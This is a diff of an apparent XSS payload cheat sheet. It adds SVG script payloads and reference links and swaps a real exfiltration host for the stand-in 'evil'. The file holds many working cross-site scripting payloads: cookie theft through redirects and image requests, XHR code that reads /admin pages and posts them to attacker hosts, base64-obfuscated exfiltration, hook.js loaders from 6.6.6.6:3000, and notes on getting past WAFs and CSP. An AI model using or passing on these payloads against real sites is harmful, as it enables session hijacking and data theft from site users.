@@ -18,6 +18,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 https://soroush.secproject.com/blog/2014/04/how-did-i-bypass-everything-in-modsecurity-evasion-challenge/
 http://sirdarckcat.blogspot.com.au/
 https://www.youtube.com/watch?v=tDjw0cmKS48 "Unusual Web Bugs" by kuza55
+https://github.com/aemkei/katakana.js # Write JavaScript alert(1) with Katakana characters only
 
 # safari URL redirection XSS - CVE-2016-4585
 http://www.mbsd.jp/blog/20160921_2.html
@@ -68,7 +69,11 @@ exec js in ff when Content-Type: xml
 
 html-encode : -> &#58; url-encode-> %26%2358%3B
 
-svg
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">alert(1);</script>
+</svg>
+or
 <svg><use xlink:href="data&#58;image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTAwIiBoZWl0aHQ9IjEwMCI+CiAgPHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4KICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgogIDxlbWJlZCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KCd4c3MnKSIgLz4KICA8L2ZvcmVpZ25PYmplY3Q+Cjwvc3ZnPg==#rectangle"></svg>
 or
 <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" /></a></svg>
@@ -106,36 +111,29 @@ asp.net: the csrf protection is to actually include the session ID is in the Vie
 # attack payloads
 <script>document.location="http://x/?c="+document.cookie</script>
 <iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://x/?c="+document.cookie)></iframe>
-<script src=//b.e.uk.to/a.js></script>
-<script>window.location='http://b.e.uk.to/'+document.documentElement.innerHTML</script>
+<script src=//evil/a.js></script>
+<script>window.location='http://evil/'+document.documentElement.innerHTML</script>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://6.6.6.6:3000/hook.js";document.body.appendChild(sc);'/>
-<iframe src=//b.e.uk.to /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
+<iframe src=//evil /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
 <a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google-ctf-2016 geokitties trick where waf triggered when there was any non-empty event handler
 \x3cimg src=a onerror=\u0022eval(String.fromCharCode(..))\u0022\x3e # 0ctf-2016 guestbook
-<img src=%23 onerror="document.location='http://b.e.uk.to/?c='%2bdocument.cookie">
-<img src=/ onerror=location='http://b.e.uk.to/?c='%2bdocument.cookie>
-new Image().src="http://b.e.uk.to/xss/?"+escape(document.cookie);
+<img src=%23 onerror="document.location='http://evil/?c='%2bdocument.cookie">
+<img src=/ onerror=location='http://evil/?c='%2bdocument.cookie>
+new Image().src="http://evil/xss/?"+escape(document.cookie);
 
 ?q=%3Clink%0Crel%3Dimport%0Chref%3D%2F%2F1.2.3.4%3E # google-ctf-2016 final destination
 
 <input type="text" onfocus="write(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwOi8vcmVxdWVzdGIuaW4vMW1sdjYxajE/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWUgKyAiJyAvPiIpOwo8L3NjcmlwdD4='));" autofocus />
 <iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B (iframe with no closing >)
 
-<script>x=new XMLHttpRequest();x.open("GET","/admin/",false);x.send();r=x.responseText;x.open("POST","http://b.e.uk.to:1234/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send(r);</script>
+<script>x=new XMLHttpRequest();x.open("GET","/admin/",false);x.send();r=x.responseText;x.open("POST","http://evil/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send(r);</script>
 <img src=x style=display:none onerror=eval(unescape(/xmlhttp%3Dnew%20XMLHttpRequest%28%29%3Bxmlhttp.open%28%22GET%22%2C%22%2fadmin%2fshow.php%22%2Cfalse%29%3Bxmlhttp.send%28%29%3Br%3Dxmlhttp.responseText%3Bxmlhttp.open%28%22POST%22%2C%22http%3A%2f%2frequestb.in%2f17b3o8z1%22%2Ctrue%29%3Bxmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3Bxmlhttp.send%28r%29%3B/.source));//
 
-try {
-    xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
-} catch(e) {
-    xmlhttp = new XMLHttpRequest()
-}
-xmlhttp.open("GET","/home?page=infos",false);
-xmlhttp.send(null);
-var info = xmlhttp.responseText;
-var cookie = info.substr(info.indexOf("VIEWSTATE=\"\>0x")+15,10); // change accordingly
-xmlhttp.open("POST","/blah");
-xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-xmlhttp.send("cookie="+cookie);
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script>
+<script>
+  var x = $('body').html().toString();
+  $.post('http://evil/analytics', x);
+</script>
 
 document.body.appendChild(document.createElement("script")).src="http://6.6.6.6:3000/hook.js"
 
@@ -182,6 +180,7 @@ http://www.thespanner.co.uk/2015/02/19/another-xss-auditor-bypass/
 
 # CSP tricks
 https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22
+http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html
 
 # length restriction bypasses
 convert to domxss: <script>eval(location.hash.substr(1))</script>
